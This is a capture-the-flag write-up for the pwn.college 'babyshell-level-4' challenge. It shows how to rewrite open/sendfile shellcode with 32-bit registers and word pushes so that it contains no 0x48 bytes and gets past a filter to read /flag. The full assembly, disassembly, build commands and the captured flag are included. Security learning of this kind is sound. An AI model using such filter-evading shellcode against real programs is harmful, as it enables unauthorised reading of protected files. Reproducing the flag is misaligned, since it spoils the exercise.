# level4
## Description
Write and execute shellcode to read the flag, but your inputted data is filtered before execution.
## Solution
- The challenge file in `/challenge` is `babyshell-level-4`. Running it and giving it a sample input of `90` (the opcode of `nop`):
```
###
### Welcome to ./babyshell-level-4!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x3072a000!
Reading 0x1000 bytes from stdin.

90
Executing filter...

This challenge requires that your shellcode have no H bytes!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000003072a000 | 39 30                                         | cmp dword ptr [rax], esi

Executing shellcode!

Segmentation fault
```
- The shellcode is filtered to not contain the byte `0x48` (ASCII `H`). I learnt that `H` bytes are used to denote instructions that operate on 64-bit registers. If we use 32-bit registers, we can avoid the `H` bytes.
- Here is the same disassembly of our code from [level1](./level1.md) that we saw in [level3](./level3.md):
```

shellcode-elf:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <__bss_start-0x1000>:
  401000:       48 bb 2f 66 6c 61 67    movabs rbx,0x67616c662f
  401007:       00 00 00 
  40100a:       53                      push   rbx
  40100b:       48 c7 c0 02 00 00 00    mov    rax,0x2
  401012:       48 89 e7                mov    rdi,rsp
  401015:       48 c7 c6 00 00 00 00    mov    rsi,0x0
  40101c:       0f 05                   syscall
  40101e:       48 c7 c7 01 00 00 00    mov    rdi,0x1
  401025:       48 89 c6                mov    rsi,rax
  401028:       48 c7 c2 00 00 00 00    mov    rdx,0x0
  40102f:       49 c7 c2 e8 03 00 00    mov    r10,0x3e8
  401036:       48 c7 c0 28 00 00 00    mov    rax,0x28
  40103d:       0f 05                   syscall
  40103f:       48 c7 c0 3c 00 00 00    mov    rax,0x3c
  401046:       0f 05                   syscall
```
- There are a bunch of `H` bytes in the shellcode. After a bit of trial and error and working instruction-by-instruction, I was able to remove all `H` bytes from the shellcode. Here is the final shellcode:
```
.intel_syntax noprefix
    push word ptr 0x0067        # push "/flag" filename
    push word ptr 0x616c
    push word ptr 0x662f
    mov r8, rsp
    mov rdi, r8                  
    mov eax, 2				    # syscall number of open				
    mov esi, 0				    # NULL out the second argument (meaning, O_RDONLY)
    syscall				        # trigger open("/flag", NULL)
    mov edi, 1				    # first argument to sendfile is the file descriptor to output to (stdout)
    mov esi, eax				# second argument is the file descriptor returned by open
    mov edx, 0				    # third argument is the number of bytes to skip from the input file
    mov r10, 1000				# fourth argument is the number of bytes to transfer to the output file
    mov eax, 40				    # syscall number of sendfile
    syscall				        # trigger sendfile(1, fd, 0, 1000)
    mov eax, 60				    # syscall number of exit
    syscall				        # trigger exit()
```
- I compiled it using the following command: `gcc -nostdlib -static shellcode.s -o shellcode-elf`.
- Running `objdump -d -M intel shellcode-elf`:
```

shellcode-elf:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <__bss_start-0x1000>:
  401000:       66 6a 67                pushw  0x67
  401003:       66 68 6c 61             pushw  0x616c
  401007:       66 68 2f 66             pushw  0x662f
  40100b:       49 89 e0                mov    r8,rsp
  40100e:       4c 89 c7                mov    rdi,r8
  401011:       b8 02 00 00 00          mov    eax,0x2
  401016:       be 00 00 00 00          mov    esi,0x0
  40101b:       0f 05                   syscall
  40101d:       bf 01 00 00 00          mov    edi,0x1
  401022:       89 c6                   mov    esi,eax
  401024:       ba 00 00 00 00          mov    edx,0x0
  401029:       49 c7 c2 e8 03 00 00    mov    r10,0x3e8
  401030:       b8 28 00 00 00          mov    eax,0x28
  401035:       0f 05                   syscall
  401037:       b8 3c 00 00 00          mov    eax,0x3c
  40103c:       0f 05                   syscall
```
- We see there are no `H` bytes in the shellcode. I made the following changes:
  - Replaced `mov rbx, 0x00000067616c662f; push rbx; mov rdi, rsp` with `push word ptr 0x0067; push word ptr 0x616c; push word ptr 0x662f; mov r8, rsp; mov rdi, r8`. Splitting the "/flag" string into 3 words of 2 bytes each and pushing them onto the stack. I also discovered that by using variables like `r8` or `r9`, I can avoid the `H` bytes.
  - Replaced `mov rax, 0x2; mov rsi, 0x0` with `mov eax, 0x2; mov esi, 0x0`. Using 32-bit registers instead of 64-bit registers. 
  - Used 32-bit registers instead of 64-bit registers in all instructions that had `H` bytes.
- I extracted the shellcode using the following command: `objcopy --dump-section .text=shellcode-raw shellcode-elf`.
- I sent the shellcode to the `stdin` of the challenge using the following command: `cat shellcode-raw /dev/stdin | /challenge/babyshell-level-4`. This gave me the flag:
```
###
### Welcome to /challenge/babyshell-level-4!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x3072a000!
Reading 0x1000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode have no H bytes!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000003072a000 | 66 6a 67                                      | push 0x67
0x000000003072a003 | 66 68 6c 61                                   | push 0x616c
0x000000003072a007 | 66 68 2f 66                                   | push 0x662f
0x000000003072a00b | 49 89 e0                                      | mov r8, rsp
0x000000003072a00e | 4c 89 c7                                      | mov rdi, r8
0x000000003072a011 | b8 02 00 00 00                                | mov eax, 2
0x000000003072a016 | be 00 00 00 00                                | mov esi, 0
0x000000003072a01b | 0f 05                                         | syscall 
0x000000003072a01d | bf 01 00 00 00                                | mov edi, 1
0x000000003072a022 | 89 c6                                         | mov esi, eax
0x000000003072a024 | ba 00 00 00 00                                | mov edx, 0
0x000000003072a029 | 49 c7 c2 e8 03 00 00                          | mov r10, 0x3e8
0x000000003072a030 | b8 28 00 00 00                                | mov eax, 0x28
0x000000003072a035 | 0f 05                                         | syscall 
0x000000003072a037 | b8 3c 00 00 00                                | mov eax, 0x3c
0x000000003072a03c | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{gbvSE8AMRMRs4BqP8b6BCb8FoEQ.0FMyIDL5QTO0czW}
```